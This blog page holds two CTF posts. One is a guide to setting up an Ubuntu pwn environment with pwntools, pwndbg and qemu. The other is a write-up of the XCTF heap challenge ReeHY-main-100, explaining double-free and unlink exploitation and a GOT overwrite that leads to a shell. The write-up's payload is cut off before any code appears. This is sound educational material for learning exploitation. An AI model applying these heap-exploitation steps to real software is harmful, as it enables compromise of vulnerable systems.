<!DOCTYPE html>
<html lang="zh-cn">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"hornos3.github.com","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="CoLin&#39;s BLOG">
<meta property="og:url" content="http://hornos3.github.com/page/11/index.html">
<meta property="og:site_name" content="CoLin&#39;s BLOG">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="CoLin">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://hornos3.github.com/page/11/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-cn'
  };
</script>

  <title>CoLin's BLOG</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">CoLin's BLOG</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/02/28/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E6%90%AD%E5%BB%BAUbuntu-CTF-pwn%E7%8E%AF%E5%A2%83/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's BLOG">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/28/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E6%90%AD%E5%BB%BAUbuntu-CTF-pwn%E7%8E%AF%E5%A2%83/" class="post-title-link" itemprop="url">从零开始搭建Ubuntu CTF-pwn环境</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-02-28 22:49:11" itemprop="dateCreated datePublished" datetime="2023-02-28T22:49:11+08:00">2023-02-28</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-03-01 11:31:18" itemprop="dateModified" datetime="2023-03-01T11:31:18+08:00">2023-03-01</time>
              </span>

          <br>
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">Symbols count in article: </span>
              <span>3.7k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">Reading time &asymp;</span>
              <span>3 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>最近因为学校考试所以没怎么看pwn，但是中间虚拟机崩掉过，问题还挺严重。前几天发现能正常打开了，但是一用gdb就会出现下面让人窒息的提醒：<br />
<img src="1.png" alt="" /><br />
怎么调都不知道是怎么回事，很奇怪的是只有在开gdb的时候才会弹出这个错误，其他都是正常的。问过师傅时候无奈只能放弃这个与我并肩作战这么长时间的ubuntu 20.04，重装一个虚拟机。一不做二不休，干脆就将整个过程记录下来，便于日后查询。</p>
<h1 id="虚拟机日常维护注意事项"><a class="markdownIt-Anchor" href="#虚拟机日常维护注意事项"></a> 虚拟机日常维护注意事项</h1>
<p>在最新的VMware中对虚拟机有一个<font color="00FF00"><strong>保护选项</strong></font>，可以在指定时间间隔内保存一个快照，这样在虚拟机崩溃的时候能够快速回档到前两天的快照中，有效减少文件等的损失，而不必每次都手动保存快照。（有读者可能会怀疑为什么我不能对崩掉的虚拟机回档，实际上我做了尝试，但是上面的问题还是存在，这就不是虚拟机状态的问题了，而是某些底层硬件配置的问题，可能是硬件出问题导致调试无法进行，但具体的我也不知道应该如何处理，因此只能重装）<br />
<img src="2.png" alt="" /><br />
如上图所示，在虚拟机设置-&gt;选项中可以找到自动保护选项，根据你设置的保护间隔和最大自动保护快照数量可以计算出至少需要的磁盘空间，因此需要<font color=red><strong>保证有足够的磁盘空间</strong></font>。</p>
<p>另外，当虚拟机<font color=blue><strong>存在快照</strong></font>时，是<font color=blue><strong>不能扩充磁盘容量</strong></font>的，因此要想扩充虚拟机的虚拟磁盘，要么<font color=red><strong>在创建虚拟机时就分配足够大小的磁盘空间</strong></font>，要么就只能<font color=red><strong>删除所有的快照</strong></font>后再进行扩充（建议前者，因为有的快照删除特别慢，如果快照多的话可能要等很长时间）</p>
<h1 id="从零搭建环境"><a class="markdownIt-Anchor" href="#从零搭建环境"></a> 从零搭建环境</h1>
<p>下面就将介绍如何从零搭建一个CTF-pwn环境（由于学习仍在进行，故一些环境如远程执行环境还没有搭建的经历，如今后需要搭建，会在最后进行补充）</p>
<h2 id="1-创建虚拟机"><a class="markdownIt-Anchor" href="#1-创建虚拟机"></a> 1. 创建虚拟机</h2>
<p>可以在ubuntu官方网站上下载最新的长期支持版本，在笔者写这篇文章的时候，这个版本已经是22.04了，但还是按照20.04的版本来安装。<a target="_blank" rel="noopener" href="https://cn.ubuntu.com/download/desktop">22.04下载</a>/<a target="_blank" rel="noopener" href="https://cn.ubuntu.com/download/alternative-downloads">历史版本下载</a></p>
<p><img src="3.png" alt="" /><br />
下载的是光盘映像文件，将其放在虚拟机的工作目录中。</p>
<p>然后选择vmware上方工具栏的文件-&gt;新建虚拟机，打开新建虚拟机向导。如下：<br />
<img src="4.png" alt="" /><br />
选择自定义安装，点击下一步。</p>
<p><img src="5.png" alt="" /><br />
硬件兼容性不需要改，一般默认选择最新的vmware版本兼容，你的vmware是什么版本就用什么版本，不用修改，直接点击下一步。</p>
<p><img src="6.png" alt="" /><br />
选择安装程序光盘映像文件，点击浏览，选择你刚才下载的映像文件，然后点击下一步。</p>
<p><img src="7.png" alt="" /><br />
输入全名（这个随便输，想输什么都行），以及你登录虚拟机的用户名和密码。之后点击下一步。</p>
<p><img src="8.png" alt="" /><br />
输入虚拟机的名字，将位置浏览设置为你的虚拟机工作目录。</p>
<p><img src="9.png" alt="" /><br />
处理器数量选择。如果你的电脑配置很好而且虚拟机也需要一定的计算需要，可以设置多一些，内核数量不变，修改处理器数量。但是总数不能超过你电脑主机的内核数量。我一般选择8处理器。</p>
<p><img src="10.png" alt="" /><br />
内存大小设置。同样看主机的配置。最好不要超过主机的内存大小，否则虚拟机可能会变慢。对于pwn做题来说4GB一般就足够了。</p>
<p><img src="11.png" alt="" /><br />
网络选择。这个网络的选择可以在虚拟机创建之后随时修改，这里简单介绍一下最常用的前两种：<strong>桥接网络和NAT</strong>。桥接网络如上面所说，直接访问外部以太网，前提是虚拟机要有自己的IP地址，因此桥接网络在使用的时候大多都是勾选“与主机共用IP地址”这个选项（这个选项在创建虚拟机到这一步的时候没有显示，但是可以在上方工具栏<strong>虚拟机-&gt;设置</strong>中找到并勾选，后面再说）。某些学校的校园网可能有接入设备数量限制（笔者学校就是），这个时候虚拟机选择桥接网络可能无法联网，可以考虑使用NAT模式，在这个模式下，主机相当于一个网关，而虚拟机为网关下的机器，与外部以太网连接需要借助主机。这种模式可以有效克服上面说的校园网接入数量限制问题。<br />
因此这里选择默认NAT，<strong>最好能够保证开机之后立刻联网</strong>呃，因为需要下载一些包，安装完成之后也能改。以默认NAT进行下一步。</p>
<p><img src="12.png" alt="" /><br />
IO控制器类型，不用改直接下一步。</p>
<p><img src="13.png" alt="" /><br />
磁盘类型也不用改，直接下一步。</p>
<p><img src="14.png" alt="" /><br />
磁盘类型不用改，下一步。</p>
<p><img src="15.png" alt="" /><br />
磁盘空间设置这里，除了最大磁盘大小之外其他都不要改。为了避免出现磁盘空间不足的问题，笔者这里设置为200GB。这个大小根据自己的物理磁盘空间决定，但是不要太小，<strong>建议pwner们不要小于60GB</strong>，后面做kernel pwn搭建环境可能很占空间的。</p>
<p><img src="16.png" alt="" /><br />
磁盘文件，不用改直接下一步。</p>
<p><img src="17.png" alt="" /><br />
上面是最后确认的界面，确定好虚拟机的配置后，点击完成就可以开始创建虚拟机了。</p>
<p><img src="18.png" alt="" /><br />
之后是自动开机安装过程，耐心等待一段时间…</p>
<p><img src="19.png" alt="" /><br />
大约10分钟之后，我们就能够登录ubuntu系统了。</p>
<p><img src="20.png" alt="" /><br />
在笔者的vmware中，linux系统在安装的时候就已经安装了VMware Tools，它能够帮助你更加快捷地在主机和虚拟机中传递文件，只需拖动即可。但是笔者的虚拟机只能从打开的文件夹中拖动文件到主机，不能从桌面上直接拖动复制，从主机复制文件到虚拟机也是必须复制到打开的文件夹中。</p>
<p>自此，我们的ubuntu系统就成功搭建好了，下面进行一些配置使虚拟机能够更加轻松方便地使用。</p>
<h2 id="2-默认root权限设置"><a class="markdownIt-Anchor" href="#2-默认root权限设置"></a> 2. 默认root权限设置</h2>
<p>在做题的时候，如果我们能够直接以root的身份登录，就不需要输入n多次的密码了。</p>
<p>参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/willhu2008/article/details/121699938?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165499613116782184643247%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=165499613116782184643247&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~baidu_landing_v2~default-4-121699938-null-null.142%5Ev13%5Econtrol,157%5Ev14%5Econtrol&amp;utm_term=ubuntu20.04%E9%BB%98%E8%AE%A4root%E7%99%BB%E5%BD%95&amp;spm=1018.2226.3001.4187">资料</a>进行操作即可。根据步骤来，实测有效。</p>
<p><img src="21.png" alt="" /><br />
注意正上方的提示，重启之后我们已经成功自动以root用户登录了，完成。</p>
<h2 id="3-安装vim"><a class="markdownIt-Anchor" href="#3-安装vim"></a> 3. 安装vim</h2>
<p><code>apt install vim</code>即可</p>
<h2 id="4-修改软件源"><a class="markdownIt-Anchor" href="#4-修改软件源"></a> 4. 修改软件源</h2>
<p>ubuntu自带的软件源是国外的，速度慢有的时候还连不上，于是应修改为国内的镜像。</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_37317193/article/details/121310922?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165499699616780366572573%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=165499699616780366572573&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-121310922-null-null.142%5Ev13%5Econtrol,157%5Ev14%5Econtrol&amp;utm_term=ubuntu20.04%E9%95%9C%E5%83%8F%E6%BA%90%E9%98%BF%E9%87%8C%E4%BA%91&amp;spm=1018.2226.3001.4187">镜像与修改方法</a></p>
<p>笔者选择阿里云镜像。</p>
<p>修改完文件之后记得<code>apt update</code>和<code>apt upgrade</code>进行更新。第一次更新可能需要等一段时间，看你的网速怎么样…</p>
<h2 id="5-安装sublime-text非必要"><a class="markdownIt-Anchor" href="#5-安装sublime-text非必要"></a> 5. 安装sublime-text（非必要）</h2>
<p>使用系统自带的gedit没有补全功能，可以在ubuntu应用商店里面搜索sublime-text安装，打开py文件的时候右键选中“Open with other application”就可以使用sublime-text打开了。（这里图标显示不出来，但是安装没有问题）</p>
<p><img src="22.png" alt="" /></p>
<h2 id="6-安装pwntools"><a class="markdownIt-Anchor" href="#6-安装pwntools"></a> 6. 安装pwntools</h2>
<p>pwntools是pwn最常用的一个python包。<br />
首先需要安装pip：<code>apt install python3-pip</code><br />
然后安装pwntools：<code>pip install pwntools</code><br />
完成。</p>
<h2 id="7-安装pwndbg"><a class="markdownIt-Anchor" href="#7-安装pwndbg"></a> 7. 安装pwndbg</h2>
<p>pwndbg是gdb的插件，帮助我们在做题时进行调试。<br />
首先安装git：<code>apt install git</code><br />
然后拉取git库：<code>git clone https://github.com/pwndbg/pwndbg</code><br />
进入pwndbg目录运行bash脚本<code>setup.sh</code>即开始安装</p>
<p><img src="23.png" alt="" /><br />
运行gdb下有pwndbg标识即表示安装成功。</p>
<h2 id="8-安装libcsearcher"><a class="markdownIt-Anchor" href="#8-安装libcsearcher"></a> 8. 安装LibcSearcher</h2>
<p>请参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_40026795/article/details/107150265?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165501579816780357270501%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=165501579816780357270501&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-107150265-null-null.142%5Ev13%5Econtrol,157%5Ev14%5Econtrol&amp;utm_term=libcsearcher%E5%AE%89%E8%A3%85&amp;spm=1018.2226.3001.4187">资料</a></p>
<p>注意不要使用<s>pip install LibcSearcher</s>，这两个是不一样的，链接中的是国人写的，准确度相对高一些。</p>
<h2 id="9-安装checksec"><a class="markdownIt-Anchor" href="#9-安装checksec"></a> 9. 安装checksec</h2>
<p>请参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43430261/article/details/105516051?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165501780216782248583442%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=165501780216782248583442&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-105516051-null-null.142%5Ev13%5Econtrol,157%5Ev14%5Econtrol&amp;utm_term=checksec%E5%AE%89%E8%A3%85&amp;spm=1018.2226.3001.4187">资料</a></p>
<p><strong>到这一步完成之后，一般的pwn题就可以开始做了。如果需要kernel环境，则继续下面的步骤。</strong></p>
<h2 id="10-安装qemu"><a class="markdownIt-Anchor" href="#10-安装qemu"></a> 10. 安装qemu</h2>
<p>使用<code>apt list qemu*</code>可查看所有前缀为qemu的包。可以看到这里有很多支持不同架构的qemu。<br />
<img src="24.png" alt="" /><br />
根据自己的需要安装对应架构的包即可。一般最为常用的是x86架构：<code>apt install qemu-system-x86</code>，注意不能只输入<code>apt install qemu</code>。</p>
<h2 id="11-配置kernel-pwn环境"><a class="markdownIt-Anchor" href="#11-配置kernel-pwn环境"></a> 11. 配置kernel pwn环境</h2>
<p>较为复杂，这里给出笔者以前写的资料。<br />
<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_54218833/article/details/124360103">资料</a></p>
<h2 id="12-安装vmlinux-to-elf"><a class="markdownIt-Anchor" href="#12-安装vmlinux-to-elf"></a> 12. 安装vmlinux-to-elf</h2>
<p>这是一个用于将bzImage解压为vmlinux的工具，在kernel pwn中经常用到：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/marin-m/vmlinux-to-elf</span><br><span class="line"><span class="built_in">cd</span> vmlinux-to-elf</span><br><span class="line">sudo python3 ./setup.py install</span><br></pre></td></tr></table></figure>
<p>然后就可以使用vmlinux-to-elf命令进行解压了。</p>
<h2 id="13-arm-pwn环境搭建"><a class="markdownIt-Anchor" href="#13-arm-pwn环境搭建"></a> 13. ARM pwn环境搭建</h2>
<p>参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_38154820/article/details/125875703?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522166613948816782427428087%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=166613948816782427428087&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-125875703-null-null.142%5Ev59%5Epc_rank_34_1,201%5Ev3%5Econtrol_1&amp;utm_term=arm%20pwn&amp;spm=1018.2226.3001.4187">资料</a>中的做法如下：</p>
<p>虽然说在x86-64的机器上无法直接运行ARM架构的elf文件，但我们可以通过qemu来实现。虽然可以使用docker在x86-64的机器上创建一个ARM架构的docker容器，但太过麻烦，在容器中还需要安装很多东西。因此可以直接使用qemu与gdb-multiarch配合。</p>
<p>实际上qemu不仅可以用来起一个qemu容器，还可以仅仅运行一个其他架构的elf文件，可以添加选项<code>-g &lt;端口号&gt;</code>将elf程序映射到某一个端口，而且还会等待接入，只有当我们使用gdb-multiarch接入时才会开始准备执行其中的第一条指令，非常方便我们下断点。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install gdb-multiarch</span><br><span class="line">sudo apt install qemu-user-static</span><br></pre></td></tr></table></figure>
<p>如果要执行的文件名为./pwn，则使用qemu执行该ARM可执行文件的命令为：<br />
<code>qemu-arm-static -g 9999 -L . ./pwn</code><br />
之后启动gdb-multiarch：<br />
<code>gdb-multiarch ./pwn</code><br />
连接端口：<br />
<code>pwndbg&gt; target remote 9999</code><br />
即可开始调试。<br />
如果想直接执行不调试，只需要删除qemu-arm-static中的-g选项即可。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/02/28/XCTF%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-4-ReeHY-main-100-%E9%A2%98%E8%A7%A3/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's BLOG">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/28/XCTF%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-4-ReeHY-main-100-%E9%A2%98%E8%A7%A3/" class="post-title-link" itemprop="url">XCTF攻防世界 4-ReeHY-main-100 题解</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-02-28 22:48:10" itemprop="dateCreated datePublished" datetime="2023-02-28T22:48:10+08:00">2023-02-28</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-03-02 16:34:32" itemprop="dateModified" datetime="2023-03-02T16:34:32+08:00">2023-03-02</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/write-ups/" itemprop="url" rel="index"><span itemprop="name">write-ups</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/write-ups/%E5%85%B6%E4%BB%96/" itemprop="url" rel="index"><span itemprop="name">其他</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">Symbols count in article: </span>
              <span>9.2k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">Reading time &asymp;</span>
              <span>8 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>昨天整理做过的题目时发现的这道题，简单看了下觉得挺有参考意义的，在此回顾。</p>
<p>源文件：<a target="_blank" rel="noopener" href="https://github.com/Hornos3/pwnfile">my_github</a></p>
<p>这是一道典型的堆题。内部一共实现了增加、删除、编辑3个功能。</p>
<p><img src="1.png" alt="" /></p>
<p>经过分析，漏洞主要有：</p>
<ol>
<li>在create_exploit函数中的两个整型溢出漏洞，使chunk地址可以写到缓冲区的高地址处</li>
<li>在delete_exploit函数中的double free漏洞，释放后没有清空指针</li>
</ol>
<p><img src="2.png" alt="" /><br />
<img src="3.png" alt="" /></p>
<p>经过gdb调试发现，bss段中对于chunk相关信息的存储结构如下：</p>
<p><img src="4.png" alt="" /></p>
<p>在create一个chunk时，程序会将chunk的size写入chunksize_bank_chunk这个chunk中，但如果输入的索引为负数，就会导致size写入到前面的内容中。索引值为-1可以修改这个chunk的size，索引值为-2时可以将这个chunk的size改得很大很大。同时注意，在索引值为-2时，申请的chunk会将chunksize_bank_chunk覆盖掉，也就是0x6020C0的位置，这个地方变成了我们自己申请的chunk了。这样可以将前面分配的chunk的size修改掉，从而可以在edit函数中触发堆溢出。</p>
<p>看来这道题能做文章的漏洞有很多，但是还有一个问题就是，如何获取libc地址？程序中并没有输出的操作。但是，plt表中有puts函数。我们将free函数的got表地址改成puts的plt，就能够实现输出，当然前提是这个chunk要在got表的地方，这样才能拿到got表的地址。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.got.plt:0000000000602018 off_602018      dq offset free          ; DATA XREF: _free↑r</span><br><span class="line">.got.plt:0000000000602020 off_602020      dq offset puts          ; DATA XREF: _puts↑r</span><br><span class="line">.got.plt:0000000000602028 off_602028      dq offset write         ; DATA XREF: _write↑r</span><br><span class="line">.got.plt:0000000000602030 off_602030      dq offset read          ; DATA XREF: _read↑r</span><br><span class="line">.got.plt:0000000000602038 off_602038      dq offset memcpy        ; DATA XREF: _memcpy↑r</span><br><span class="line">.got.plt:0000000000602040 off_602040      dq offset malloc        ; DATA XREF: _malloc↑r</span><br><span class="line">.got.plt:0000000000602048 off_602048      dq offset fflush        ; DATA XREF: _fflush↑r</span><br><span class="line">.got.plt:0000000000602050 off_602050      dq offset setvbuf       ; DATA XREF: _setvbuf↑r</span><br><span class="line">.got.plt:0000000000602058 off_602058      dq offset atoi          ; DATA XREF: _atoi↑r</span><br><span class="line">.got.plt:0000000000602060 off_602060      dq offset exit          ; DATA XREF: _exit↑r</span><br></pre></td></tr></table></figure>
<p>要修改的是0x602018，那么应该将chunk分配到0x602008的地方。我们需要进行一次double_free操作。</p>
<p>经过gdb调试发现，在glibc 2.27及更高版本无法进行此次double free，因为在_int_free中加入了检查tcache的double free，但2.23中没有发现这类检查代码，因此转到2.23进行调试。</p>
<p>double_free之后UAF，将fd改为0x602008。我满怀期待地执行下一步，gdb却给我来了当头一棒——<code>malloc(): memory corruption (fast)</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (fastbin_index (chunksize (victim)) != idx, <span class="number">0</span>))</span><br><span class="line">&#123;</span><br><span class="line">  errstr = <span class="string">&quot;malloc(): memory corruption (fast)&quot;</span>;</span><br><span class="line">errout:</span><br><span class="line">  malloc_printerr (check_action, errstr, chunk2mem (victim), av);</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>检查通不过：目的地址对应的size必须正确。</p>
<p>看来这条路是走不通了。看下一个思路：unlink。</p>
<p>如果是使用unlink的话，就无需考虑是否存在tcache了。如果有tcache则分配一个large bins大小的chunk让它被释放时不进tcache就好了。</p>
<p>记得在之前的how2heap分析中，对于unlink是直接将后面chunk的prev_inuse置为0的。这里我们不能直接这样做，而是需要利用未被清空的指针。</p>
<p>Step 1: 分配两个非tcache chunk并释放。释放之后，这两个chunk会被合并入top chunk中，绕过double free的检测。<br />
Step 2: 分配一个大chunk使得这个chunk能够包含之前的两个chunk且还要多出一些空间。这一步是为了编辑这两个原先的chunk做准备的。这个大chunk和Step 1中第一个分配的chunk的地址应该是相同的。<br />
Step 3: 在大chunk中构造数据，在原chunk_1前后构造假chunk使free能够通过检查。<br />
Step 4: 释放原chunk_1。</p>
<p><strong>注意：在大chunk中需要在原chunk_1前后均伪造，这是为了通过unlink和_int_free的检查。在后方构造chunk主要构造其prev_inuse位为1以绕过line 4316 (glibc 2.31)的检查，在前方构造chunk是为了绕过unlink的检查，在how2heap中有分析，如有疑问请移步我之前写的how2heap分析文章，这里不再赘述。</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (!prev_inuse(nextchunk)))</span><br><span class="line">      malloc_printerr (<span class="string">&quot;double free or corruption (!prev)&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>这样，释放chunk_1就能够成功，chunk_0的地址也会被修改到bss段上（0x6020C8）。我们现在可以通过chunk_0随意修改bss段中保存有chunk信息的部分了。之后的操作就是水到渠成：</p>
<p>Step 5: 将chunk_1的地址改为free的got表地址，修改为puts的plt地址。<br />
Step 6: 将chunk_2的地址改为got表中除前两个函数外其他任意一个函数的地址，然后调用free输出地址。利用此地址计算libc的加载地址。<br />
Step 7: 将计算得到的system地址写到free的got表地址中，向chunk_3写入’/bin/sh’（或者找到libc中本来就有的’/bin/sh’字符串地址，将其写到chunk_3的位置上）。<br />
Step 8: 释放chunk_3，getshell。</p>
<p>payload: （本payload在Kali上测试成功，libc版本：Debian GLIBC 2.33-6，2022/4/5最新更新版本）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span 